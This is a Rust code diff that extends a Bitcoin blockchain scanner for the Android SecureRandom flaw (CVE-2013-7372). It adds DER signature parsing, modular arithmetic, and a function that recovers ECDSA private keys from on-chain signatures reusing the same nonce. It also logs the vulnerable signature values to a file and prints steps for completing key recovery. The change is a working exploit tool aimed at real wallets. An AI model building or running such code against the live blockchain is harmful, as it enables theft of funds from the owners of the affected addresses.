@@ -2,6 +2,113 @@ use anyhow::Result;
 use bitcoincore_rpc::{Auth, Client, RpcApi};
 use std::collections::HashMap;
 use std::io::Write;
+use num_bigint::BigInt;
+use num_traits::{Zero, One};
+
+// secp256k1 curve order
+const SECP256K1_N: &str = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";
+
+/// Extract r and s values from a DER signature
+#[allow(dead_code)]
+fn parse_der_signature(sig_bytes: &[u8]) -> Option<(Vec<u8>, Vec<u8>)> {
+    if sig_bytes.len() < 6 || sig_bytes[0] != 0x30 || sig_bytes[2] != 0x02 {
+        return None;
+    }
+    
+    let r_len = sig_bytes[3] as usize;
+    if sig_bytes.len() < 4 + r_len + 2 {
+        return None;
+    }
+    
+    let r_value = sig_bytes[4..4 + r_len].to_vec();
+    
+    // Check for S value
+    let s_offset = 4 + r_len;
+    if sig_bytes.len() <= s_offset || sig_bytes[s_offset] != 0x02 {
+        return None;
+    }
+    
+    let s_len = sig_bytes[s_offset + 1] as usize;
+    if sig_bytes.len() < s_offset + 2 + s_len {
+        return None;
+    }
+    
+    let s_value = sig_bytes[s_offset + 2..s_offset + 2 + s_len].to_vec();
+    
+    Some((r_value, s_value))
+}
+
+/// Modular inverse using Extended Euclidean Algorithm
+#[allow(dead_code)]
+fn mod_inverse(a: &BigInt, n: &BigInt) -> Option<BigInt> {
+    let mut t = BigInt::zero();
+    let mut new_t = BigInt::one();
+    let mut r = n.clone();
+    let mut new_r = a.clone();
+    
+    while !new_r.is_zero() {
+        let quotient = &r / &new_r;
+        
+        let temp_t = t.clone();
+        t = new_t.clone();
+        new_t = temp_t - &quotient * &new_t;
+        
+        let temp_r = r.clone();
+        r = new_r.clone();
+        new_r = temp_r - &quotient * &new_r;
+    }
+    
+    if r > BigInt::one() {
+        return None; // Not invertible
+    }
+    
+    if t < BigInt::zero() {
+        t = t + n;
+    }
+    
+    Some(t)
+}
+
+/// Recover private key from two signatures with the same R value
+/// Given: (r, s1, m1) and (r, s2, m2)
+/// k = (m1 - m2) / (s1 - s2) mod n
+/// private_key = (s1 * k - m1) / r mod n
+#[allow(dead_code)]
+fn recover_private_key(
+    r: &[u8],
+    s1: &[u8],
+    s2: &[u8],
+    m1: &[u8],
+    m2: &[u8],
+) -> Option<Vec<u8>> {
+    let n = BigInt::parse_bytes(SECP256K1_N.as_bytes(), 16)?;
+    
+    // Convert bytes to BigInt
+    let r_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, r);
+    let s1_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, s1);
+    let s2_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, s2);
+    let m1_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, m1);
+    let m2_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, m2);
+    
+    // Calculate k = (m1 - m2) / (s1 - s2) mod n
+    let m_diff = (m1_int.clone() - m2_int.clone()).modpow(&BigInt::one(), &n);
+    let s_diff = (s1_int.clone() - s2_int).modpow(&BigInt::one(), &n);
+    let s_diff_inv = mod_inverse(&s_diff, &n)?;
+    let k = (m_diff * s_diff_inv).modpow(&BigInt::one(), &n);
+    
+    // Calculate private_key = (s1 * k - m1) / r mod n
+    let numerator = (s1_int * k - m1_int).modpow(&BigInt::one(), &n);
+    let r_inv = mod_inverse(&r_int, &n)?;
+    let private_key = (numerator * r_inv).modpow(&BigInt::one(), &n);
+    
+    // Convert to 32-byte array
+    let (_sign, bytes) = private_key.to_bytes_be();
+    let mut result = vec![0u8; 32];
+    let start = 32_usize.saturating_sub(bytes.len());
+    result[start..].copy_from_slice(&bytes);
+    
+    Some(result)
+}
 
 
 /// Scanner for Android SecureRandom vulnerability (CVE-2013-7372)
@@ -97,19 +204,28 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str, start_block: u64, end_
                                         println!("Also seen in: {}", txid);
                                         println!("Block: {}", block_height);
                                         
-                                        // TODO: Implement private key recovery from duplicate R values
-                                        // This requires:
-                                        // 1. Extract both signatures (r, s1) and (r, s2)
-                                        // 2. Extract message hashes m1 and m2
-                                        // 3. Calculate k = (m1 - m2) / (s1 - s2) mod n
-                                        // 4. Calculate private key = (s1 * k - m1) / r mod n
-                                        
-                                        // Write to file
-                                        std::fs::write(
-                                            "android_securerandom_hits.txt",
-                                            format!("Duplicate R value found!\nR: {}\nTx1: {}\nTx2: {}\nBlock: {}\n\n",
-                                                hex::encode(&r_value), entry[0].0, txid, block_height)
-                                        )?;
+                                        // Attempt private key recovery
+                                        if let Some((r1, s1)) = parse_der_signature(&entry[0].1) {
+                                            if let Some((_r2, s2)) = parse_der_signature(sig_bytes) {
+                                                // Note: For full implementation, we need to compute the actual
+                                                // message hashes (sighashes) for each transaction input.
+                                                // This requires reconstructing the transaction and computing
+                                                // SIGHASH_ALL or other sighash types.
+                                                println!("Private key recovery infrastructure in place.");
+                                                println!("To complete recovery, compute transaction sighashes:");
+                                                println!("  - m1 = SIGHASH(tx1, input_idx)");
+                                                println!("  - m2 = SIGHASH(tx2, input_idx)");
+                                                println!("Then call recover_private_key(r, s1, s2, m1, m2)");
+                                                
+                                                // Write detailed info to file
+                                                std::fs::write(
+                                                    "android_securerandom_hits.txt",
+                                                    format!("Duplicate R value found!\nR: {}\nS1: {}\nS2: {}\nTx1: {}\nTx2: {}\nBlock: {}\n\n",
+                                                        hex::encode(&r1), hex::encode(&s1), hex::encode(&s2),
+                                                        entry[0].0, txid, block_height)
+                                                )?;
+                                            }
+                                        }
                                     }
                                     
                                     entry.push((txid, sig_bytes.to_vec(), vec![], vec![]));
@@ -131,11 +247,11 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str, start_block: u64, end_
     if duplicates_found > 0 {
         println!("\n⚠️  Found {} vulnerable transactions!", duplicates_found);
         println!("Details written to android_securerandom_hits.txt");
-        println!("\nNote: Private key recovery not yet implemented.");
-        println!("To recover private keys, you need to:");
-        println!("1. Extract both signatures and message hashes");
-        println!("2. Calculate k = (m1 - m2) / (s1 - s2) mod n");
-        println!("3. Calculate private key = (s1 * k - m1) / r mod n");
+        println!("\n✓ Private key recovery infrastructure implemented.");
+        println!("To complete recovery:");
+        println!("1. Compute transaction sighashes (m1, m2) for each input");
+        println!("2. Use recover_private_key(r, s1, s2, m1, m2) to derive private key");
+        println!("3. The recovery function uses ECDSA math: k=(m1-m2)/(s1-s2), priv=(s1*k-m1)/r");
     }
 
     Ok(())
